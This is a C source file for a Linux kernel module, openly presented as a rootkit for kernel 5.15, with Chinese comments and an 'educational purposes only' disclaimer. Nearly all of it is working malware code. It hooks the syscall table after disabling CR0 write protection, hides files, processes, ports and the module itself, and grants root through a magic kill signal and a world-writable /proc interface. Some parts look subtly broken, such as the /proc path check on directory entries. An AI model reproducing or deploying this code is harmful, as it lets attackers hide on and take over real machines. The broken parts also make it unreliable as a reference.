/*
 * Advanced Linux Rootkit for Kernel 5.15.142
 * Features: Module hiding, Privilege escalation, File hiding, Process hiding, Port hiding
 * Author: Security Research
 * Warning: This is for educational and research purposes only
 */

#include "rootkit.h"

// 全局变量
struct list_head *module_previous;
short module_hidden = 0;
static struct proc_dir_entry *proc_entry;

// 隐藏的文件列表
struct hidden_file {
    char *name;
    struct list_head list;
};
static LIST_HEAD(hidden_files);

// 隐藏的进程列表
struct hidden_proc {
    pid_t pid;
    struct list_head list;
};
static LIST_HEAD(hidden_procs);

// 隐藏的端口列表
struct hidden_port {
    unsigned short port;
    int protocol; // IPPROTO_TCP or IPPROTO_UDP
    struct list_head list;
};
static LIST_HEAD(hidden_ports);

// 函数声明
static int __init rootkit_init(void);
static void __exit rootkit_exit(void);
static void hide_module(void);
static void show_module(void);
static int is_hidden_file(const char *name);
static int is_hidden_proc(pid_t pid);
static int is_hidden_port(unsigned short port, int protocol);
static void grant_root_privileges(void);

// 原始系统调用指针
static asmlinkage long (*original_getdents64)(const struct pt_regs *);
static asmlinkage long (*original_getdents)(const struct pt_regs *);
static asmlinkage long (*original_kill)(const struct pt_regs *);

// 系统调用表相关
void disable_write_protection(void);
void enable_write_protection(void);

// 外部模块函数声明
extern int init_module_hiding(void);
extern void cleanup_module_hiding(void);
extern int init_privilege_escalation(void);
extern void cleanup_privilege_escalation(void);
extern int init_file_hiding(void);
extern void cleanup_file_hiding(void);
extern int init_process_hiding(void);
extern void cleanup_process_hiding(void);
extern int init_port_hiding(void);
extern void cleanup_port_hiding(void);

// 导出系统调用表和保护函数给子模块使用
unsigned long *sys_call_table;
EXPORT_SYMBOL(sys_call_table);
EXPORT_SYMBOL(disable_write_protection);
EXPORT_SYMBOL(enable_write_protection);
EXPORT_SYMBOL(module_previous);
EXPORT_SYMBOL(module_hidden);

// 查找系统调用表
static unsigned long *find_sys_call_table(void) {
    unsigned long *syscall_table;
    
#if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
#else
    unsigned long int i;
    for (i = (unsigned long int)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
        syscall_table = (unsigned long *)i;
        if (syscall_table[__NR_close] == (unsigned long)sys_close) {
            return syscall_table;
        }
    }
#endif
    return syscall_table;
}

// 禁用写保护
void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

// 启用写保护
void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}

// 模块隐藏功能
static void hide_module(void) {
    if (module_hidden) return;
    
    module_previous = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
    
    printk(KERN_INFO "[%s] Module hidden\n", MODULE_NAME);
}

static void show_module(void) {
    if (!module_hidden) return;
    
    list_add(&THIS_MODULE->list, module_previous);
    module_hidden = 0;
    
    printk(KERN_INFO "[%s] Module visible\n", MODULE_NAME);
}

// 提权功能
static void grant_root_privileges(void) {
    struct cred *new_cred;
    
    new_cred = prepare_creds();
    if (new_cred == NULL) {
        return;
    }
    
    new_cred->uid.val = 0;
    new_cred->gid.val = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    new_cred->suid.val = 0;
    new_cred->sgid.val = 0;
    new_cred->fsuid.val = 0;
    new_cred->fsgid.val = 0;
    
    commit_creds(new_cred);
    
    printk(KERN_INFO "[%s] Root privileges granted to PID %d\n", MODULE_NAME, current->pid);
}

// 检查是否为隐藏文件
static int is_hidden_file(const char *name) {
    struct hidden_file *hf;
    
    list_for_each_entry(hf, &hidden_files, list) {
        if (strstr(name, hf->name) != NULL) {
            return 1;
        }
    }
    
    // 隐藏以特定前缀开头的文件
    if (strncmp(name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
        return 1;
    }
    
    return 0;
}

// 检查是否为隐藏进程
static int is_hidden_proc(pid_t pid) {
    struct hidden_proc *hp;
    
    list_for_each_entry(hp, &hidden_procs, list) {
        if (hp->pid == pid) {
            return 1;
        }
    }
    
    return 0;
}

// 检查是否为隐藏端口
static int is_hidden_port(unsigned short port, int protocol) {
    struct hidden_port *hp;
    
    list_for_each_entry(hp, &hidden_ports, list) {
        if (hp->port == port && hp->protocol == protocol) {
            return 1;
        }
    }
    
    return 0;
}

// Hook getdents64 系统调用
static asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;
    int ret;
    
    ret = original_getdents64(regs);
    if (ret <= 0) return ret;
    
    dirent_ker = kzalloc(ret, GFP_KERNEL);
    if (dirent_ker == NULL) return ret;
    
    if (copy_from_user(dirent_ker, dirent, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    while (offset < ret) {
        current_dir = (void *)dirent_ker + offset;
        
        if (is_hidden_file(current_dir->d_name) || 
            (strncmp(current_dir->d_name, "/proc/", 6) == 0 && 
             is_hidden_proc(simple_strtoul(current_dir->d_name + 6, NULL, 10)))) {
            
            if (current_dir == dirent_ker) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            
            previous_dir->d_reclen += current_dir->d_reclen;
        } else {
            previous_dir = current_dir;
        }
        
        offset += current_dir->d_reclen;
    }
    
    if (copy_to_user(dirent, dirent_ker, ret)) {
        kfree(dirent_ker);
        return ret;
    }
    
    kfree(dirent_ker);
    return ret;
}

// Hook kill 系统调用用于控制接口
static asmlinkage long hooked_kill(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    
    // 魔术信号用于控制rootkit
    if (sig == 64) {
        switch (pid) {
            case 1: // 隐藏模块
                hide_module();
                return 0;
            case 2: // 显示模块
                show_module();
                return 0;
            case 3: // 提权
                grant_root_privileges();
                return 0;
            default:
                break;
        }
    }
    
    return original_kill(regs);
}

// Proc文件系统接口
static ssize_t proc_write(struct file *file, const char __user *buffer, size_t count, loff_t *pos) {
    char *cmd;
    char *token, *param;
    struct hidden_file *hf;
    struct hidden_proc *hp;
    struct hidden_port *hport;
    
    cmd = kzalloc(count + 1, GFP_KERNEL);
    if (!cmd) return -ENOMEM;
    
    if (copy_from_user(cmd, buffer, count)) {
        kfree(cmd);
        return -EFAULT;
    }
    
    cmd[count] = '\0';
    
    token = strsep(&cmd, " ");
    param = cmd;
    
    if (strcmp(token, "hide_file") == 0 && param) {
        hf = kmalloc(sizeof(struct hidden_file), GFP_KERNEL);
        if (hf) {
            hf->name = kstrdup(strim(param), GFP_KERNEL);
            list_add(&hf->list, &hidden_files);
            printk(KERN_INFO "[%s] File hidden: %s\n", MODULE_NAME, hf->name);
        }
    } else if (strcmp(token, "hide_proc") == 0 && param) {
        hp = kmalloc(sizeof(struct hidden_proc), GFP_KERNEL);
        if (hp) {
            hp->pid = simple_strtoul(strim(param), NULL, 10);
            list_add(&hp->list, &hidden_procs);
            printk(KERN_INFO "[%s] Process hidden: %d\n", MODULE_NAME, hp->pid);
        }
    } else if (strcmp(token, "hide_port") == 0 && param) {
        hport = kmalloc(sizeof(struct hidden_port), GFP_KERNEL);
        if (hport) {
            char *port_str = strsep(&param, " ");
            char *proto_str = param;
            hport->port = simple_strtoul(port_str, NULL, 10);
            hport->protocol = (proto_str && strcmp(proto_str, "udp") == 0) ? IPPROTO_UDP : IPPROTO_TCP;
            list_add(&hport->list, &hidden_ports);
            printk(KERN_INFO "[%s] Port hidden: %d/%s\n", MODULE_NAME, hport->port, 
                   hport->protocol == IPPROTO_TCP ? "tcp" : "udp");
        }
    } else if (strcmp(token, "root") == 0) {
        grant_root_privileges();
    } else if (strcmp(token, "hide_module") == 0) {
        hide_module();
    } else if (strcmp(token, "show_module") == 0) {
        show_module();
    }
    
    kfree(cmd);
    return count;
}

static const struct proc_ops proc_fops = {
    .proc_write = proc_write,
};

// 模块初始化
static int __init rootkit_init(void) {
    printk(KERN_INFO "[%s] Loading rootkit module...\n", MODULE_NAME);
    
    // 查找系统调用表
    sys_call_table = find_sys_call_table();
    if (!sys_call_table) {
        printk(KERN_ERR "[%s] Cannot find sys_call_table\n", MODULE_NAME);
        return -1;
    }
    
    // 保存原始系统调用
    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
    original_kill = (void *)sys_call_table[__NR_kill];
    
    // Hook系统调用
    disable_write_protection();
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)hooked_kill;
    enable_write_protection();
    
    // 初始化子模块
    if (init_module_hiding() != 0) {
        printk(KERN_ERR "[%s] Failed to initialize module hiding\n", MODULE_NAME);
        goto cleanup_syscalls;
    }
    
    if (init_privilege_escalation() != 0) {
        printk(KERN_ERR "[%s] Failed to initialize privilege escalation\n", MODULE_NAME);
        goto cleanup_module_hiding;
    }
    
    if (init_file_hiding() != 0) {
        printk(KERN_ERR "[%s] Failed to initialize file hiding\n", MODULE_NAME);
        goto cleanup_privilege;
    }
    
    if (init_process_hiding() != 0) {
        printk(KERN_ERR "[%s] Failed to initialize process hiding\n", MODULE_NAME);
        goto cleanup_file_hiding;
    }
    
    if (init_port_hiding() != 0) {
        printk(KERN_ERR "[%s] Failed to initialize port hiding\n", MODULE_NAME);
        goto cleanup_process_hiding;
    }
    
    // 创建proc接口
    proc_entry = proc_create(PROC_ENTRY, 0666, NULL, &proc_fops);
    if (!proc_entry) {
        printk(KERN_ERR "[%s] Cannot create proc entry\n", MODULE_NAME);
        goto cleanup_port_hiding;
    }
    
    printk(KERN_INFO "[%s] Rootkit loaded successfully\n", MODULE_NAME);
    printk(KERN_INFO "[%s] Control interface: /proc/%s\n", MODULE_NAME, PROC_ENTRY);
    
    return 0;

cleanup_port_hiding:
    cleanup_port_hiding();
cleanup_process_hiding:
    cleanup_process_hiding();
cleanup_file_hiding:
    cleanup_file_hiding();
cleanup_privilege:
    cleanup_privilege_escalation();
cleanup_module_hiding:
    cleanup_module_hiding();
cleanup_syscalls:
    disable_write_protection();
    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
    sys_call_table[__NR_kill] = (unsigned long)original_kill;
    enable_write_protection();
    return -1;
}

// 模块清理
static void __exit rootkit_exit(void) {
    struct hidden_file *hf, *hf_tmp;
    struct hidden_proc *hp, *hp_tmp;
    struct hidden_port *hport, *hport_tmp;
    
    printk(KERN_INFO "[%s] Unloading rootkit module...\n", MODULE_NAME);
    
    // 恢复系统调用
    if (sys_call_table) {
        disable_write_protection();
        sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
        sys_call_table[__NR_kill] = (unsigned long)original_kill;
        enable_write_protection();
    }
    
    // 显示模块
    if (module_hidden) {
        show_module();
    }
    
    // 删除proc接口
    if (proc_entry) {
        proc_remove(proc_entry);
    }
    
    // 清理子模块
    cleanup_port_hiding();
    cleanup_process_hiding();
    cleanup_file_hiding();
    cleanup_privilege_escalation();
    cleanup_module_hiding();
    
    // 清理隐藏文件列表
    list_for_each_entry_safe(hf, hf_tmp, &hidden_files, list) {
        list_del(&hf->list);
        kfree(hf->name);
        kfree(hf);
    }
    
    // 清理隐藏进程列表
    list_for_each_entry_safe(hp, hp_tmp, &hidden_procs, list) {
        list_del(&hp->list);
        kfree(hp);
    }
    
    // 清理隐藏端口列表
    list_for_each_entry_safe(hport, hport_tmp, &hidden_ports, list) {
        list_del(&hport->list);
        kfree(hport);
    }
    
    printk(KERN_INFO "[%s] Rootkit unloaded\n", MODULE_NAME);
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Security Research");
MODULE_DESCRIPTION("Advanced Linux Rootkit for Educational Purposes");
MODULE_VERSION("1.0");